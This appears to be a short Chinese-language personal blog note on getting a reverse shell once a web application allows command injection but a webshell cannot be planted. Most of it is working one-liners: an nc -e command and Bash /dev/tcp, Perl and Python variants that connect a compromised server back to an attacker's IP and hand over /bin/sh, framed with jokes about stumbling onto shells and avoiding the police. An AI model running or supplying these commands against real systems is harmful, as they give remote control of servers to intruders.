[ Note - shell 反彈 ] 小小筆記

嗯，又到約定的兩個禮拜一次的寫 Blog 了
想了一天，結果最後來寫個 shell 反彈好了 XD

由於人在網路飄，馬路跟網路一樣寬，大家撿到、踢到、夢到什麼應該都合情合理
當然，所以偶爾踢到一些 shell 應該也是情有可原
可是有得時候 web 只有 command injection，可是 webshell 上不去、webshell 遇到某些特殊字元刪不掉、或是其他狀況怎麼辦？

這時我們可以嘗試看看用 nc 反連（或是用其他 shell 反彈）來達成

嗯... 原本想說來截圖一些反連或漏洞畫面...
想想算了，大概會被請去喝咖啡 (遮臉)

我們一般看到的 nc 反連教學應該是... 

 
nc {IP} {Port} -e /bin/sh

nc 是一個遠端連線的程式，基本上大部分的 Linux 、 Unix預設是都會安裝
如果想知道相關教學可以參考 GTW(中文) 或是鳥哥

來簡單講一下這語法的使用方式，我們要在對方 Server 上執行這句，那對方 Server 就會被連到我們指定的地方，連到我們指定的 port
值得一提的是，我們這邊的 IP 不能是代理、Private IP，或被防火牆擋住，不然連線不到

但有一些 Linux 或 Unix ，可能由於安全或是其他問題，把 -e 參數拿掉了，那我們該怎麼辦呢?
需要 wget 或是 download 其他後門在 build 嗎？
呃... 當然是可以，不過這樣做一套下來，天都亮了，所以我們這邊不用這種方法

這時山不轉，路轉，Serve 不轉，各種黑黑轉 (X)
這時我們就可以用其他語言來達成這些事情

Bash 

 
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Perl 

 
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python 

 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
